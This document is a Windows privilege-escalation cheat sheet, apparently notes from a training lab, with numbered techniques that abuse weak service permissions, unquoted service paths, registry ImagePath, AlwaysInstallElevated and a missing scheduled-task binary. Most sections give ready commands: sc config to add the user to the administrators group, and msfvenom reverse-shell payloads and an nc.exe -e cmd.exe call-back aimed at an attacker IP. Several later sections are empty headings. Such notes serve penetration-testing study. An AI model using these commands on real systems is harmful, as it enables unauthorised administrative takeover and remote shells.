For Windows Priviledge Escalation guide you can follow these two posts:


1-https://www.fuzzysecurity.com/tutorials/16.html


2-https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/


HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:

![Windows_priv_esc_password_credentials](https://user-images.githubusercontent.com/55708909/92549895-fb567a00-f277-11ea-947d-8929d12b723d.png)


1- Services (binpath):
-----------------------------------------------------------------------
         First transfer the accesschk64.exe to system 
   
         Run accesschk64.exe -accepteula
   
         Run accesschk64.exe -wvuc "Service name"       accesschk64.exe -wvuc daclsvc
   
   ![Service(BIn_Path)](https://user-images.githubusercontent.com/55708909/92556310-390ecf00-f287-11ea-8a85-1af55670e7aa.png)

          You will see that everyone has read and write permission to change SERVICE_CHANGE_CONFIG
          
          Write this: sc config daclsvc binPath= "net localgroup administrators user /add"
          
          Then write this : sc start daclsvc 
          
          You will be added to admin group 

![Service(BIn_Path_1)](https://user-images.githubusercontent.com/55708909/92556850-8c355180-f288-11ea-982b-b02fd5864ca2.png)


2- Services (Unquoted path):
---------------------------------------------------------------------------------------
          For it to work we need to identify which are the path which are not included in quotes
          
          wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
          
 ![Service(Unquoted_path)](https://user-images.githubusercontent.com/55708909/92557524-05817400-f28a-11ea-9d03-b9f21efc8826.png)

          First transfer nc.exe to C:\Users\user directory
          
          msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service > common.exe
          
          Transfer the common.exe to C:\Program Files\Unquoted Path Service
          
          type sc start unquotedsvc
          
 ![Service(Unquoted_path_1)](https://user-images.githubusercontent.com/55708909/92558713-c3a5fd00-f28c-11ea-9423-fe436ac65491.png)
         
          

3- Service (Registry):
-------------------------------------------------------------------------------------------
            
            For this to work check for registry permission using this commands.
            
            Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
            
![Service_registry_1](https://user-images.githubusercontent.com/55708909/92689186-34681a80-f35c-11ea-9f43-9d23a8807143.png)
 
            You will see that interactive has full control this means we can modify the registry with our own version
            
 ![Service_registry_2](https://user-images.githubusercontent.com/55708909/92689485-b6f0da00-f35c-11ea-9cad-7217f4876374.png)
             
             Compile the file using this command: x86_64-w64-mingw32-gcc windows_service.c -o x.exe
             
             Transfer the x.exe file to C:\Temp directory and use the following command to make it work
             
             reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
             
             You will see you will be added to administrator group
             
             sc start regsvc
             
![Service_registry_3](https://user-images.githubusercontent.com/55708909/92689754-3c748a00-f35d-11ea-9514-d905b1245dc0.png)
             
             
4- Services( Executable files):
---------------------------------------------------------------------------------------------
          
           Transfer the accesschk.exe to pc and check for weak executable service
           
![Service(Executable)](https://user-images.githubusercontent.com/55708909/92559368-1a600680-f28e-11ea-940d-2472ece84622.png)
 
            We notice that everyone has read and write access to filepermservice.exe
            
            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > filepermservice.exe
            
            transfer filepermservice.exe to target system
            
            copy /y filepermservice.exe "C:\Program Files\File Permissions Service"

            sc start filepermsvc 
            
![Service(Executable_1)](https://user-images.githubusercontent.com/55708909/92560004-45972580-f28f-11ea-88fd-f5c365dd41ef.png)

           
5- Registry (Always installed elevated):
---------------------------------------------------------------------------------------------
            
            reg query HKLM\Software\Policies\Microsoft\Windows\Installer
            
            reg query HKCU\Software\Policies\Microsoft\Windows\Installer
            
            If they gave output as 1 then this means we can create our payload in msi format and can escalate priv
            
            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f msi > access.msi

            Transfer it to target machine
            
            msiexec /quiet /qn /i C:\Users\user\access.msi
 
            Netcat session with admin rights
            
![Registry(Always_install)](https://user-images.githubusercontent.com/55708909/92560985-ef2ae680-f290-11ea-8166-aeb34190e869.png)
            
6- Registry (Modified autorun): Need to have admin login to work
-------------------------------------------------------------------------------------------------
             
   ![REgistry_auto_run](https://user-images.githubusercontent.com/55708909/92561769-72007100-f292-11ea-919a-444e7874cd5b.png)
   
             As you can see everyone has read and write to program.exe this means simply replace that executable
              
             with your version of executable and wait for admin to login and have admin rights

7- Password minig (Registry):
-------------------------- -----------------------------------------------------------------

![Password_mining(REgistry)](https://user-images.githubusercontent.com/55708909/92564190-66af4480-f296-11ea-9139-eea67ec26650.png)

             
8- Password mining (Memory)
-----------------------------------------------------------------------------------------
          

9- Password mining (Configuration Files):
------------------------------------------------------------------------------------------
        
![Password_mining(Configuration)](https://user-images.githubusercontent.com/55708909/92562987-7ded3280-f294-11ea-9a0e-b9551fae7529.png)

![Password_mining(Configuration_1)](https://user-images.githubusercontent.com/55708909/92563469-3e731600-f295-11ea-98ad-8517e167fc2f.png)

            
10- Scheduled tasks (Missing binary):
------------------------------------------------------------------------------------------

        While checking for schedule task we found one of the binary missings.
        
 ![Windows_Priv_Esc_scheduled_task_missing_binary](https://user-images.githubusercontent.com/55708909/92596152-04b90400-f2c3-11ea-8f25-7d4b8ac8379b.png)
       
        Program.exe is missing
        
        msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > program.exe
        
        Put it in C:\Missing Schedule Binary and restart pc 
        
        You will have admin access

![Schedule_task_missing_binary](https://user-images.githubusercontent.com/55708909/92596554-9cb6ed80-f2c3-11ea-9f13-c4a96b5ba764.png)


11- Startup applications: (Need to have admin login to work)
--------------------------------------------------------------------------------------------
        
        As you can see users has full access over the mention directory and therefore can change the binary with there
        
        own version and thus leding to priv escalations
        
![Start_up_app_1](https://user-images.githubusercontent.com/55708909/92597636-51054380-f2c5-11ea-9ddd-aa93dfbf7ab7.png)
        
        Put the exe in mention directory and wait for admin to login to esc priv
        
12- Potato attacks:(https://github.com/itm4n/PrintSpoofer.git)
--------------------------------------------------------------------------------------------

13- DLL Hijacking:
----------------------------------------------------------------------------------------------

14-Kernel exploits:
----------------------------------------------------------------------------------------------
